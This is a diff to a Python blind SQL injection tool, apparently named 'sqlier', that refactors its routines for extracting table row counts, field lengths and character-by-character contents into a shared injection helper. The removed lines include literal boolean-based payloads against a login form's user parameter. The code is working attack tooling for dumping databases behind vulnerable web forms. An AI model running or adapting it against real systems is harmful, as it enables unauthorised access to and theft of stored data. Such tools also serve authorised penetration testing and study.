@@ -2,7 +2,8 @@
 # -*- coding:utf-8 -*-
 from lib.log import logger
 from columns import SqliColumns
-from config import UnpackFunction
+from sqlier.config import UnpackFunction
+from lib.dealpayload import build_injection
 from prettytable import PrettyTable
 from tqdm import trange
 import threading
@@ -140,21 +141,14 @@ class SqliContent(SqliColumns):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 然后注content 的 length
-                for j in trange(100, desc="Content sqli...", leave=False, disable=True):
-                    logger.debug("Start %dth content length sqli..." % (limits + 1))
-                    # payload = "user=user1' %26%26 (select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
-                    #     limits) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_build_payload(
-                        select="length(" + column_name + ")",
-                        source=database_name + "." + table_name,
-                        limit=limits,
-                        compare=j)
-                    if self.Data.GetBuildData(payload, self.len) == 0:
-                        content_len = j
-                        break
-                    elif j == 100:
-                        logger.error("Content length > 100...")
-                        content_len = 100
+
+                retVal = build_injection(select="length(" + column_name + ")",
+                                         source=database_name + "." + table_name,
+                                         limit=limits,
+                                         dealpayload=self.dealpayload, data=self.Data,
+                                         lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                content_len = int(retVal)
 
                 logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
                 logger.info("[*] content_len: %d" % content_len)
@@ -163,19 +157,14 @@ class SqliContent(SqliColumns):
                 # 清空column_name
                 content = ""
                 logger.debug("Start %dth content sqli..." % (limits + 1))
-                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
-                    for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
-                                    leave=False, disable=True):
-                        # payload = "user=user1' %26%26 (select ((SELECT ascii(substring(" + column_name + "," + repr(
-                        #     j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
-                        #     limits) + ",1) >" + repr(k + 30) + "))%23&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_build_payload(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
-                                                                           source=database_name + "." + table_name,
-                                                                           limit=limits,
-                                                                           compare=(k + 30))
-                        if self.Data.GetBuildData(payload, self.len) == 0:
-                            content += chr(int(k + 30))
-                            break
+
+                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False):
+                    retVal = build_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
+                                             source=database_name + "." + table_name,
+                                             limit=limits,
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isStrings=True, sqlirequest=self.sqlirequest)
+                    content += chr(retVal)
 
                 logger.debug("Content sqli success...The content is %s..." % content)
 
@@ -277,22 +266,13 @@ class SqliContent(SqliColumns):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 然后注content 的length
-                for j in trange(100, desc="Content sqli...", leave=False, disable=True):
-                    logger.debug("Start %dth content length sqli..." % (limits + 1))
-                    # payload = {
-                    #     "user": "user1' && (select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
-                    #         limits) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_build_payload(
-                        select="length(" + column_name + ")",
-                        source=database_name + "." + table_name,
-                        limit=limits,
-                        compare=j)
-                    if self.Data.PostBuildData(payload, self.len) == 0:
-                        content_len = j
-                        break
-                    elif j == 100:
-                        logger.error("Content length > 100...")
-                        content_len = 100
+                retVal = build_injection(select="length(" + column_name + ")",
+                                         source=database_name + "." + table_name,
+                                         limit=limits,
+                                         dealpayload=self.dealpayload, data=self.Data,
+                                         lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                content_len = int(retVal)
 
                 logger.debug(
                     "Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
@@ -302,20 +282,14 @@ class SqliContent(SqliColumns):
                 # 清空column_name
                 content = ""
                 logger.debug("Start %dth content sqli..." % (limits + 1))
-                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
-                    for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
-                                    leave=False, disable=True):
-                        # payload = {"user": "user1' && (select ((SELECT ascii(substring(" + column_name + "," + repr(
-                        #     j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
-                        #     limits) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_build_payload(
-                            select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
-                            source=database_name + "." + table_name,
-                            limit=limits,
-                            compare=(k + 30))
-                        if self.Data.PostBuildData(payload, self.len) == 0:
-                            content += chr(int(k + 30))
-                            break
+
+                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False):
+                    retVal = build_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
+                                             source=database_name + "." + table_name,
+                                             limit=limits,
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isStrings=True, sqlirequest=self.sqlirequest)
+                    content += chr(retVal)
 
                 logger.debug("Content sqli success...The content is %s..." % content)
 
@@ -411,19 +385,11 @@ class SqliContent(SqliColumns):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start table's %s content amount sqli..." % table_name)
 
-                for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
-                    # 先注content的数量
-                    # payload = "user=user1' %26%26 (select ((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + "))%23&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_build_payload(
-                        select="count(*)",
-                        source=database_name + "." + table_name,
-                        compare=i)
-                    if self.Data.GetBuildData(payload, self.len) == 0:
-                        content_count = i
-                        break
-                    elif i == 100:
-                        logger.error("Content amount > 100...")
-                        content_count = 100
+                retVal = build_injection(select="count(*)",
+                                         source=database_name + "." + table_name,
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                content_count = int(retVal)
 
                 logger.debug("Content account sqli success...The content_count is %d..." % content_count)
                 logger.info("[*] content_count: %d" % content_count)
@@ -485,20 +451,11 @@ class SqliContent(SqliColumns):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start table's %s content amount sqli..." % table_name)
 
-                for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
-                    # 先注content的数量
-                    # payload = {
-                    #     "user": "user1' && (select ((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + "))#", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_build_payload(
-                        select="count(*)",
-                        source=database_name + "." + table_name,
-                        compare=i)
-                    if self.Data.PostBuildData(payload, self.len) == 0:
-                        content_count = i
-                        break
-                    elif i == 100:
-                        logger.error("Content amount > 100...")
-                        content_count = 100
+                retVal = build_injection(select="count(*)",
+                                         source=database_name + "." + table_name,
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                content_count = int(retVal)
 
                 logger.debug("Content account sqli success...The content_count is %d..." % content_count)
                 logger.info("[*] content_count: %d" % content_count)
